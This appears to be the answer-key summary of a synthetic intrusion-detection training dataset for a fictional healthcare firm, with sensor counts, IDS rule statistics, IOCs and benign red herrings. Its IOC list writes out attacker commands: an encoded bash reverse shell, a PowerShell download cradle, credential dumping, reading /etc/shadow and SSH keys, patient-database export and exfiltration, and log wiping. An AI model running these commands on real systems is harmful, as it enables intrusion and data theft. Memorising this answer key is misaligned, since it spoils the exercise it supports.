| dd442c07-67a3-48d4-bec0-343c4abbf142 | ids | delayed: 1 |
| de547b79-bd54-4917-8427-ce49b82d8091 | ids | delayed: 1 |
| e000bd0d-3f70-488d-a6a9-5e392cdba866 | ids | delayed: 1 |
| e5d9d23e-6284-4208-8372-c08760a48ec5 | ids | delayed: 1 |
| e792afc4-7f3c-4c5e-bd5d-7a8625297534 | ids | delayed: 2 |
| ec3ba289-7353-4d70-a82a-9a08a59d3e02 | ids | delayed: 1 |
| ee359a15-da61-40f2-9fc4-eb66fc05f3cf | ids | delayed: 1 |
| ee626f56-c29b-4bb2-b0f9-b5427ef64ee5 | ids | delayed: 1 |
| eeaadfa2-c7b2-4f1b-a54b-89b9316301f0 | ids | delayed: 1 |
| evt-001 | asa | delayed: 6 |
| evt-001 | ecar | delayed: 2 |
| evt-001 | ids | filtered: 1 |
| evt-001 | web | delayed: 1 |
| evt-001 | zeek | delayed: 3, filtered: 4 |
| evt-002 | asa | delayed: 429, dropped: 1, filtered: 1, visible: 2 |
| evt-002 | ecar | delayed: 426, dropped: 7 |
| evt-002 | ids | delayed: 15 |
| evt-002 | web | delayed: 383 |
| evt-002 | zeek | delayed: 623, dropped: 3, filtered: 2, visible: 189 |
| evt-003 | syslog | delayed: 3 |
| evt-003 | zeek | visible: 2 |
| evt-004 | asa | delayed: 2 |
| evt-004 | ecar | delayed: 2 |
| evt-004 | web | delayed: 2 |
| evt-004 | zeek | delayed: 2, visible: 2 |
| evt-005 | asa | delayed: 2 |
| evt-005 | ecar | delayed: 4 |
| evt-005 | syslog | visible: 1 |
| evt-005 | web | delayed: 1 |
| evt-005 | zeek | delayed: 2, visible: 1 |
| evt-006 | asa | delayed: 30, visible: 1 |
| evt-006 | bash_history | visible: 7 |
| evt-006 | ecar | delayed: 51, dropped: 2 |
| evt-006 | syslog | delayed: 9 |
| evt-006 | windows_security | delayed: 2 |
| evt-006 | zeek | delayed: 22, visible: 9 |
| evt-007 | bash_history | visible: 3 |
| evt-007 | ecar | delayed: 6 |
| evt-008 | asa | delayed: 4, filtered: 1 |
| evt-008 | ecar | delayed: 8 |
| evt-008 | ids | delayed: 2 |
| evt-008 | syslog | delayed: 4 |
| evt-008 | windows_security | delayed: 3 |
| evt-008 | zeek | delayed: 6, visible: 2 |
| evt-009 | bash_history | visible: 2 |
| evt-009 | ecar | delayed: 4 |
| evt-010 | ecar | delayed: 8 |
| evt-010 | sysmon | delayed: 8 |
| evt-010 | windows_security | delayed: 2 |
| evt-011 | ecar | delayed: 1 |
| evt-011 | syslog | delayed: 1 |
| evt-011 | windows_security | delayed: 1 |
| evt-012 | asa | delayed: 2, filtered: 5 |
| evt-012 | ecar | delayed: 16 |
| evt-012 | sysmon | delayed: 7 |
| evt-012 | windows_security | delayed: 23, dropped: 1 |
| evt-012 | zeek | delayed: 9 |
| evt-013 | asa | delayed: 2, filtered: 1 |
| evt-013 | ecar | delayed: 44, dropped: 1 |
| evt-013 | sysmon | delayed: 42 |
| evt-013 | windows_security | delayed: 19 |
| evt-013 | zeek | delayed: 3, visible: 1 |
| evt-014 | ecar | delayed: 13 |
| evt-014 | sysmon | delayed: 13 |
| evt-014 | windows_security | delayed: 2 |
| evt-015 | asa | delayed: 3 |
| evt-015 | ecar | delayed: 24 |
| evt-015 | sysmon | delayed: 22 |
| evt-015 | windows_security | delayed: 11 |
| evt-015 | zeek | delayed: 3, visible: 1 |
| evt-016 | ecar | delayed: 36 |
| evt-016 | sysmon | delayed: 36 |
| evt-016 | windows_security | delayed: 10 |
| evt-017 | asa | delayed: 2 |
| evt-017 | ecar | delayed: 32 |
| evt-017 | sysmon | delayed: 24, dropped: 7 |
| evt-017 | windows_security | delayed: 11 |
| evt-017 | zeek | delayed: 3 |
| evt-018 | asa | delayed: 23 |
| evt-018 | ecar | delayed: 30, dropped: 1 |
| evt-018 | proxy | delayed: 10 |
| evt-018 | sysmon | delayed: 18 |
| evt-018 | windows_security | delayed: 15 |
| evt-018 | zeek | delayed: 36, visible: 24 |
| evt-019 | asa | delayed: 3, out_of_window: 1 |
| evt-019 | ecar | delayed: 3, out_of_window: 1 |
| evt-019 | proxy | delayed: 3, out_of_window: 1 |
| evt-019 | sysmon | delayed: 3, out_of_window: 1 |
| evt-019 | zeek | delayed: 4, out_of_window: 2, visible: 2 |
| evt-020 | asa | delayed: 26, dropped: 1, filtered: 268 |
| evt-020 | ecar | delayed: 293, dropped: 2 |
| evt-020 | ids | delayed: 6, dropped: 1, filtered: 252 |
| evt-020 | sysmon | delayed: 18 |
| evt-020 | windows_security | delayed: 311 |
| evt-020 | zeek | delayed: 425, dropped: 2, filtered: 4, visible: 159 |
| evt-021 | asa | delayed: 88, visible: 3 |
| evt-021 | ecar | delayed: 91 |
| evt-021 | ids | delayed: 18, dropped: 2, filtered: 160 |
| evt-021 | windows_security | delayed: 90, dropped: 1 |
| evt-021 | zeek | delayed: 136, visible: 46 |
| evt-022 | asa | delayed: 2 |
| evt-022 | ecar | delayed: 29 |
| evt-022 | sysmon | delayed: 28 |
| evt-022 | windows_security | delayed: 12 |
| evt-022 | zeek | delayed: 2 |
| evt-023 | asa | filtered: 5 |
| evt-023 | bash_history | visible: 12 |
| evt-023 | ecar | delayed: 40, dropped: 1 |
| evt-023 | syslog | delayed: 10 |
| evt-023 | windows_security | delayed: 3 |
| evt-023 | zeek | delayed: 4, visible: 4 |
| evt-024 | windows_security | delayed: 1 |
| evt-025 | asa | delayed: 3, visible: 1 |
| evt-025 | ecar | delayed: 33 |
| evt-025 | proxy | delayed: 1 |
| evt-025 | sysmon | delayed: 28 |
| evt-025 | windows_security | delayed: 9 |
| evt-025 | zeek | delayed: 4, visible: 4 |
| evt-026 | asa | delayed: 5, filtered: 3 |
| evt-026 | ecar | delayed: 9 |
| evt-026 | proxy | delayed: 3 |
| evt-026 | windows_security | delayed: 2 |
| evt-026 | zeek | delayed: 14, visible: 4 |
| evt-027 | ecar | delayed: 1 |
| evt-027 | windows_security | delayed: 2 |
| evt-028 | bash_history | visible: 1 |
| evt-028 | ecar | delayed: 2 |
| evt-029 | bash_history | visible: 1 |
| evt-029 | ecar | delayed: 3 |
| evt-030 | asa | delayed: 4 |
| evt-030 | ecar | delayed: 29 |
| evt-030 | proxy | delayed: 1 |
| evt-030 | sysmon | delayed: 26 |
| evt-030 | windows_security | delayed: 9 |
| evt-030 | zeek | delayed: 10 |
| evt-031 | asa | filtered: 3 |
| evt-031 | ecar | delayed: 3 |
| evt-031 | windows_security | delayed: 3 |
| evt-031 | zeek | delayed: 6 |
| evt-032 | ecar | delayed: 17 |
| evt-032 | sysmon | delayed: 17 |
| evt-032 | windows_security | delayed: 4 |
| evt-033 | ecar | delayed: 11, dropped: 1 |
| evt-033 | sysmon | delayed: 11 |
| evt-033 | windows_security | delayed: 12 |
| evt-034 | ecar | delayed: 2 |
| evt-034 | sysmon | delayed: 1 |
| evt-034 | windows_security | delayed: 2 |
| evt-035 | ecar | delayed: 2 |
| evt-035 | syslog | delayed: 2 |
| evt-email-001 | asa | delayed: 8, filtered: 2, visible: 1 |
| evt-email-001 | ecar | delayed: 31 |
| evt-email-001 | proxy | delayed: 2 |
| evt-email-001 | syslog | delayed: 10 |
| evt-email-001 | sysmon | delayed: 24 |
| evt-email-001 | windows_security | delayed: 12 |
| evt-email-001 | zeek | delayed: 22, visible: 2 |
| evt-email-002 | asa | delayed: 3 |
| evt-email-002 | ecar | delayed: 4 |
| evt-email-002 | proxy | delayed: 1 |
| evt-email-002 | sysmon | delayed: 2 |
| evt-email-002 | windows_security | delayed: 2 |
| evt-email-002 | zeek | delayed: 6 |
| evt-email-003 | asa | delayed: 7, filtered: 3 |
| evt-email-003 | ecar | delayed: 28, dropped: 16 |
| evt-email-003 | syslog | delayed: 12 |
| evt-email-003 | sysmon | delayed: 43 |
| evt-email-003 | windows_security | delayed: 24 |
| evt-email-003 | zeek | delayed: 19, visible: 5 |
| evt-email-004 | asa | delayed: 4, filtered: 3 |
| evt-email-004 | ecar | delayed: 11 |
| evt-email-004 | syslog | delayed: 16 |
| evt-email-004 | windows_security | delayed: 3 |
| evt-email-004 | zeek | delayed: 12, visible: 10 |
| evt-email-005 | asa | delayed: 2 |
| evt-email-005 | ecar | delayed: 2 |
| evt-email-005 | syslog | delayed: 2 |
| evt-email-005 | windows_security | delayed: 1 |
| evt-email-005 | zeek | delayed: 2, visible: 2 |
| evt-email-006 | asa | delayed: 5 |
| evt-email-006 | ecar | delayed: 8 |
| evt-email-006 | syslog | delayed: 8 |
| evt-email-006 | sysmon | delayed: 6 |
| evt-email-006 | windows_security | delayed: 5 |
| evt-email-006 | zeek | delayed: 6, visible: 9 |
| evt-email-007 | asa | delayed: 6, filtered: 2 |
| evt-email-007 | ecar | delayed: 14 |
| evt-email-007 | syslog | delayed: 9 |
| evt-email-007 | windows_security | delayed: 5 |
| evt-email-007 | zeek | delayed: 20, visible: 4 |
| evt-email-008 | asa | delayed: 8, filtered: 2 |
| evt-email-008 | ecar | delayed: 31 |
| evt-email-008 | proxy | delayed: 2 |
| evt-email-008 | syslog | delayed: 11 |
| evt-email-008 | sysmon | delayed: 25 |
| evt-email-008 | windows_security | delayed: 11 |
| evt-email-008 | zeek | delayed: 17, visible: 7 |
| evt-email-009 | asa | delayed: 1 |
| evt-email-009 | ecar | delayed: 1 |
| evt-email-009 | syslog | delayed: 2 |
| evt-email-009 | sysmon | delayed: 1 |
| evt-email-009 | windows_security | delayed: 1 |
| evt-email-009 | zeek | delayed: 2 |
| evt-email-010 | asa | delayed: 1 |
| evt-email-010 | ecar | delayed: 1 |
| evt-email-010 | syslog | delayed: 2 |
| evt-email-010 | zeek | delayed: 5 |
| evt-email-011 | asa | delayed: 9, filtered: 3 |
| evt-email-011 | ecar | delayed: 19 |
| evt-email-011 | proxy | delayed: 2 |
| evt-email-011 | syslog | delayed: 9 |
| evt-email-011 | sysmon | delayed: 10 |
| evt-email-011 | windows_security | delayed: 11 |
| evt-email-011 | zeek | delayed: 27, visible: 6 |
| f1cd6e18-10cc-4b85-8a12-fe8225041f3b | ids | delayed: 2 |
| f1f75d3e-9801-4c82-bafa-565431a72aaf | ids | filtered: 1 |
| fbebdb97-a882-4dde-975d-e62254dc59b1 | ids | delayed: 1 |
| fc905d87-1a71-41bc-b62e-84024bf1874f | ids | delayed: 1 |
| fe11c479-56f2-4a5f-8613-6ebb4f6b6647 | ids | delayed: 1 |
| ff0e9c54-1e9f-40cd-9f6a-47c3c355249e | ids | delayed: 1 |
| red_herring:rh-001 | ecar | delayed: 8 |
| red_herring:rh-001 | sysmon | delayed: 4 |
| red_herring:rh-001 | windows_security | delayed: 8 |
| red_herring:rh-002 | asa | delayed: 1 |
| red_herring:rh-002 | ecar | delayed: 39 |
| red_herring:rh-002 | sysmon | delayed: 38 |
| red_herring:rh-002 | windows_security | delayed: 12 |
| red_herring:rh-002 | zeek | visible: 1 |
| red_herring:rh-003 | asa | delayed: 2 |
| red_herring:rh-003 | ecar | delayed: 5 |
| red_herring:rh-003 | ids | delayed: 1 |
| red_herring:rh-003 | proxy | delayed: 1 |
| red_herring:rh-003 | zeek | delayed: 4 |


## IDS Evaluation Summary

Observation totals: delayed=185, dropped=3, filtered=414, visible=4.

| Sensor | GID:SID | Candidates | Emitted | Policy Filtered | Origins | Digest |
|--------|---------|------------|---------|-----------------|---------|--------|
| snort-core | 1:2000334 | 1 | 1 | 0 | built_in=1 | `d4a927454aff` |
| snort-core | 1:2000357 | 2 | 2 | 0 | built_in=2 | `14e314a35079` |
| snort-core | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `289336052b9d` |
| snort-core | 1:2016149 | 7 | 7 | 0 | built_in=7 | `a8a2026d5b6a` |
| snort-core | 1:2024291 | 9 | 9 | 0 | built_in=9 | `cd307ad34cff` |
| snort-core | 1:2024392 | 1 | 1 | 0 | built_in=1 | `a99dce2ad53e` |
| snort-core | 1:2027757 | 9 | 9 | 0 | built_in=9 | `8f5f791ad09d` |
| snort-core | 1:2027863 | 6 | 6 | 0 | built_in=6 | `b4f96bddc95e` |
| snort-core | 1:2027865 | 102 | 22 | 80 | authored_attachment=9, built_in=13 | `3dc38c84fb4c` |
| snort-core | 1:2029706 | 267 | 15 | 252 | authored_attachment=6, built_in=9 | `26a71e5c13de` |
| snort-core | 1:382 | 2 | 2 | 0 | built_in=2 | `da4040d1985c` |
| snort-perimeter | 1:2000357 | 1 | 1 | 0 | built_in=1 | `6778459dd63e` |
| snort-perimeter | 1:2000428 | 3 | 3 | 0 | built_in=3 | `c97ae36b14a3` |
| snort-perimeter | 1:2000560 | 1 | 1 | 0 | built_in=1 | `43f46cdcaec5` |
| snort-perimeter | 1:2000575 | 4 | 4 | 0 | built_in=4 | `407c77f05c4d` |
| snort-perimeter | 1:2002910 | 16 | 15 | 1 | built_in=15 | `53a31691421b` |
| snort-perimeter | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `e51a825e2cc9` |
| snort-perimeter | 1:2003068 | 4 | 4 | 0 | built_in=4 | `856aa8c7cedd` |
| snort-perimeter | 1:2010935 | 2 | 2 | 0 | built_in=2 | `0457da873865` |
| snort-perimeter | 1:2013028 | 5 | 5 | 0 | built_in=5 | `c2bdba03b74c` |
| snort-perimeter | 1:2013504 | 3 | 3 | 0 | authored_attachment=1, built_in=2 | `418b09d1042a` |
| snort-perimeter | 1:2016149 | 2 | 2 | 0 | built_in=2 | `b904b3d1a2d1` |
| snort-perimeter | 1:2016360 | 1 | 1 | 0 | built_in=1 | `2f875d5b54c6` |
| snort-perimeter | 1:2018959 | 5 | 5 | 0 | built_in=5 | `29d4b575aa00` |
| snort-perimeter | 1:2022476 | 1 | 1 | 0 | built_in=1 | `ae43c5f9f925` |
| snort-perimeter | 1:2023672 | 2 | 2 | 0 | built_in=2 | `56a83ac89102` |
| snort-perimeter | 1:2023882 | 3 | 3 | 0 | built_in=3 | `6f193a2a423c` |
| snort-perimeter | 1:2024290 | 4 | 4 | 0 | built_in=4 | `8d4b563a6060` |
| snort-perimeter | 1:2024291 | 5 | 5 | 0 | built_in=5 | `676d7e8f0eee` |
| snort-perimeter | 1:2024392 | 2 | 2 | 0 | built_in=2 | `2fe1cf91b93d` |
| snort-perimeter | 1:2024897 | 3 | 3 | 0 | built_in=3 | `f64f2bba52c6` |
| snort-perimeter | 1:2025712 | 1 | 1 | 0 | built_in=1 | `18c7b0423872` |
| snort-perimeter | 1:2025991 | 5 | 5 | 0 | built_in=5 | `0c3eafbfcdfd` |
| snort-perimeter | 1:2027316 | 1 | 1 | 0 | built_in=1 | `31a1f6551d29` |
| snort-perimeter | 1:2027757 | 3 | 3 | 0 | built_in=3 | `e5aa60a8f167` |
| snort-perimeter | 1:2027863 | 4 | 4 | 0 | built_in=4 | `238324eb7d42` |
| snort-perimeter | 1:2027865 | 94 | 14 | 80 | authored_attachment=9, built_in=5 | `e3983fd60658` |
| snort-perimeter | 1:2028401 | 5 | 5 | 0 | built_in=5 | `7fc37478228e` |
| snort-perimeter | 1:2029706 | 7 | 7 | 0 | built_in=7 | `680d611d6859` |
| snort-perimeter | 1:366 | 3 | 3 | 0 | built_in=3 | `01967b889034` |
| snort-perimeter | 1:382 | 2 | 2 | 0 | built_in=2 | `694fb94c37ce` |
| snort-perimeter | 1:384 | 2 | 2 | 0 | built_in=2 | `2989907fc15f` |


## Indicators of Compromise (IOCs)

### Network IOCs

- 10.10.1.35 (Attacker IP)
- 10.10.1.35:3389 (Lateral Movement)
- 10.10.1.99 (Attacker IP)
- 10.10.2.10:389 (Internal Server)
- 10.10.2.30:22 (Lateral Movement)
- 10.10.3.10:443 (Web Scan Target)
- 10.10.3.20:22 (Internal Server)
- 10.10.4.10:22 (Lateral Movement)
- 203.14.220.10:443 (C2 Server)
- 2j3rhpi2329sn.top (DGA Domain)
- 30rgw6r7503.top (DGA Domain)
- 45.33.32.30:443 (Beacon Target)
- 45.33.32.30:443 (C2 Server)
- 45.33.32.30:443 (Denied Beacon Target)
- 45.33.32.30:8443 (C2 Server)
- 6cja6syvo02mu.top (DGA Domain)
- DC-01.meridianhcs.local (Malicious DNS Query)
- Message-ID: <100000I9EMNA.1000OREDIL@meridianhcs.com>
- Message-ID: <1000016ONZTK.10015EDCND@meridianhcs.com>
- Message-ID: <121609FF-AFF2-1350-BCEC-8A52032BE7D0@meridianhcs.com>
- Message-ID: <1486572785.976919.3e76dbd7@meridianhcs.com>
- Message-ID: <1746897100.499514.89c6aefa@meridianhcs.com>
- Message-ID: <billing-a1f65b41-3807664@medclaims-processing.net>
- Message-ID: <notices-b9dac45a-8235363@benefits-serviceportal.com>
- Message-ID: <workspace-e2b1dcaf-9440641@docflow-health.net>
- Port 22 (scan target)
- Port 3306 (scan target)
- Port 443 (scan target)
- Port 80 (scan target)
- Port 8080 (scan target)
- Port 8443 (scan target)
- SMTP Zeek UID: C1Dhbw56kLITklHgi7
- SMTP Zeek UID: C1v00jWjueXCEzMWVY
- SMTP Zeek UID: C37ae21EjXPqZvdLxe
- SMTP Zeek UID: CBU138m7wRjiHAUcKj
- SMTP Zeek UID: CC169ciB4iwXIZol1Uz
- SMTP Zeek UID: CDKWXdx4NYM1J6mndI
- SMTP Zeek UID: CIVyfYk357H2Q0o0xI
- SMTP Zeek UID: CO77GBsjMSgXyZZe1i
- SMTP Zeek UID: COl9a9qNcrSUE2CbiN
- SMTP Zeek UID: CY6X9CU6fffbZyScKb
- SMTP Zeek UID: CmWHPsoHoTq0ZBmd2o
- SMTP Zeek UID: CnBAstlSrHWD0nVhEz
- SMTP Zeek UID: CuHnlkraEEYP3F2h2et
- SMTP Zeek UID: Cuv00DurZQUr1UkQzH
- SMTP Zeek UID: CxbAk3SOWopWGRJFvr
- Zeek UID: C0DCRdWx8S13Oq8ARc
- Zeek UID: C0xWrc3BSbpP9IdhSMU
- Zeek UID: C8OGMFYUvYBOJkXC4F
- Zeek UID: CFPWXD0xlCilf6TDao
- Zeek UID: CFXo1ISvHONRmgLLRs
- Zeek UID: CIRPxx5IFGHrdEg7C
- Zeek UID: CS82r6DNXMCYZDWtjB
- Zeek UID: Ce4UkXAoLhPTT56N0O
- Zeek UID: CfRz15RM76EhfFzrEr
- Zeek UID: Cj2BM11ABrDbS4ElwjS
- api.westbridge-services.net (Malicious DNS Query)
- edge.westbridge-services.net (Malicious DNS Query)
- ewnjsaqf1rasgez5.top (DGA Domain)
- metrics.westbridge-services.net (Malicious DNS Query)
- ns1.westbridge-services.cloud (DNS Tunnel Endpoint)
- qrdqtp5nhn66chp00.top (DGA Domain)

### Process IOCs

- /bin/bash
- /usr/bin/cat
- /usr/bin/find
- /usr/bin/gzip
- /usr/bin/ls
- /usr/bin/mysqldump
- /usr/bin/nmap
- /usr/bin/scp
- /usr/bin/shred
- /usr/sbin/ip
- C:\Windows\System32\PSEXESVC.exe
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\cmd.exe
- C:\Windows\System32\ms-index-service.exe
- C:\Windows\System32\net.exe
- C:\Windows\System32\sc.exe
- C:\Windows\System32\schtasks.exe
- C:\Windows\System32\wevtutil.exe
- C:\Windows\System32\whoami.exe
- Injection Target: C:\Windows\System32\lsass.exe
- Scheduled Task: \Microsoft\Windows\Maintenance\DeviceSync
- Service: DeviceSyncSvc
- Service: PSEXESVC
- `PSEXESVC.exe -accepteula`
- `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'`
- `cat /etc/hosts`
- `cat /etc/passwd`
- `cat /etc/resolv.conf`
- `cat /etc/shadow`
- `cat /root/.ssh/id_rsa`
- `cat /var/www/html/config.php`
- `cmd.exe /c whoami && hostname`
- `find /opt/ehr -name '*credential*' -maxdepth 3`
- `gzip -9 /tmp/rpt_0318.sql`
- `history -c && cat /dev/null > ~/.bash_history`
- `ip addr show`
- `ls -la /root/.ssh`
- `ms-index-service.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
- `mysqldump --single-transaction ehr patients insurance_claims > /tmp/rpt_0318.sql`
- `net group "Domain Admins" /domain`
- `net group "Domain Admins" svc_mhsync /add /domain`
- `net user /domain`
- `net user svc_mhsync /delete /domain`
- `net user svc_mhsync MhsSvc!2024 /add /domain`
- `net view /domain`
- `net view \\FILE-SRV-01`
- `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24`
- `nmap -sn 10.10.2.0/24`
- `powershell.exe -NoProfile -Command "Compress-Archive -Path \\FILE-SRV-01\Finance\Q1\*,\\FILE-SRV-01\Patients\Exports\* -DestinationPath C:\ProgramData\Microsoft\cache_7f3a.zip"`
- `powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBhAHAAaQAuAHcAZQBzAHQAYgByAGkAZABnAGUALQBzAGUAcgB2AGkAYwBlAHMALgBuAGUAdAAvAHYAMgAvAG0AYQBuAGkAZgBlAHMAdAAiACkA`
- `sc.exe create DeviceSyncSvc binPath= C:\Windows\System32\DeviceSyncSvc.exe obj= LocalSystem start= auto`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\DeviceSync" /SC HOURLY /TR "C:\Windows\System32\DeviceSyncSvc.exe" /RU SYSTEM`
- `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz`
- `shred -u /root/.bash_history`
- `wevtutil cl Security`
- `whoami /all`

### User IOCs

- Group: Domain Admins (compromised account)
- SYSTEM (compromised account)
- aisha.johnson (compromised account)
- aisha.johnson (Spray Target) (compromised account)
- apache (compromised account)
- diego.ramirez (compromised account)
- diego.ramirez (Spray Target) (compromised account)
- evelyn.brooks (compromised account)
- lina.nguyen (compromised account)
- marcus.chen (compromised account)
- marcus.chen (Explicit Credential Target) (compromised account)
- omar.haddad (compromised account)
- priya.patel (compromised account)
- root (compromised account)
- sophia.martinez (Spray Target) (compromised account)
- svc_mhsync (compromised account)

### File IOCs

- %SystemRoot%\PSEXESVC.exe
- /root/.bash_history
- /tmp/rpt_0318.sql
- C:\Windows\System32\DeviceSyncSvc.exe
- artifacts/email/benefits-confirmation-msg.eml
- artifacts/email/docflow-ai-summary-msg.eml
- artifacts/email/ehr-release-note-msg.eml
- artifacts/email/executive-operating-note-msg.eml
- artifacts/email/finance-forward-to-it-msg.eml
- artifacts/email/internal-reset-lure-msg.eml
- artifacts/email/vendor-interface-package-msg.eml


## Red Herrings

The following events appear suspicious but are benign. They are included to make the dataset more realistic.

| Timestamp | Actor | System | Activity | Why It's Benign |
|-----------|-------|--------|----------|-----------------|
| 2024-03-18 13:04:39 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:40 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:43 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:44 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 14:04:39 UTC | lina.nguyen | WS-LNGUYEN-01 | Developer refreshes Ubuntu package metadata from the public archive | Routine package maintenance uses the APT HTTP user agent and triggers a low-priority policy alert. |
| 2024-03-18 17:09:49 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:09:50 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:09:51 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
